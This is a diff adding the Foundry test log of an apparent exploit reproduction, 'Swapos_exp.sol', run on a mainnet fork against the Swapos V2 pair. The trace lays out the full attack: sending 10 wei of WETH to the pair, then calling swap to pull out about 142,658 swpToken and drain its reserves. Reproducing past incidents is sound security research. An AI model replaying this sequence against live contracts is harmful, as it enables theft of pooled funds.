@@ -1,0 +1,55 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Swapos_exp.sol:ContractTest
+[PASS] testExploit() (gas: 111690)
+Logs:
+  swapos balance: 3000.000000000000000000
+  ETH balance: 133.386512258125308315
+
+Traces:
+  [9674] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 17057419 [1.705e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "weth")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(swpToken: [0x09176F68003c06F190ECdF40890E3324a9589557], "swpToken")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [114490] ContractTest::testExploit()
+    ├─ [23974] weth::deposit{value: 3000000000000000000}()
+    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 3000000000000000000 [3e18])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000000029a2241af62c0000
+    │   └─ ← [Stop]
+    ├─ [8062] weth::transfer(SwaposV2Pair: [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f], 10)
+    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SwaposV2Pair: [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f], value: 10)
+    │   ├─  storage changes:
+    │   │   @ 0xde941b0194e27c81500174f277373a45e4c7f4865201929a5c7acd3d304263c7: 0x0000000000000000000000000000000000000000000000073b1c162fcdd8a191 → 0x0000000000000000000000000000000000000000000000073b1c162fcdd8a19b
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000000029a2241af62c0000 → 0x00000000000000000000000000000000000000000000000029a2241af62bfff6
+    │   └─ ← [Return] true
+    ├─ [58708] SwaposV2Pair::swap(142658161144708222114663 [1.426e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   ├─ [30261] swpToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 142658161144708222114663 [1.426e23])
+    │   │   ├─ emit Transfer(from: SwaposV2Pair: [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 142658161144708222114663 [1.426e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7665d6432c7c2b75dc8471396aec49ad9f6e236f9dc62098e51d11d2c9abd461: 0x000000000000000000000000000000000000000000001ed8250d87197aab5b67 → 0x0000000000000000000000000000000000000000000000a2a15d09519be00000
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000001e3583b07dc7decb5b67
+    │   │   └─ ← [Return] true
+    │   ├─ [585] swpToken::balanceOf(SwaposV2Pair: [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f]) [staticcall]
+    │   │   └─ ← [Return] 3000000000000000000000 [3e21]
+    │   ├─ [534] weth::balanceOf(SwaposV2Pair: [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f]) [staticcall]
+    │   │   └─ ← [Return] 133386512258125308315 [1.333e20]
+    │   ├─ emit Sync(reserve0: 3000000000000000000000 [3e21], reserve1: 133386512258125308315 [1.333e20])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 10, amount0Out: 142658161144708222114663 [1.426e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x643b88730000000000073b1c162fcdd8a191000000001ed8250d87197aab5b67 → 0x643b88730000000000073b1c162fcdd8a19b0000000000a2a15d09519be00000
+    │   └─ ← [Stop]
+    ├─ [893] SwaposV2Pair::getReserves() [staticcall]
+    │   └─ ← [Return] 3000000000000000000000 [3e21], 133386512258125308315 [1.333e20], 1681623155 [1.681e9]
+    ├─ emit log_named_decimal_uint(key: "swapos balance", val: 3000000000000000000000 [3e21], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "ETH balance", val: 133386512258125308315 [1.333e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.67s (3.80s CPU time)
+
+Ran 1 test suite in 7.79s (5.67s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
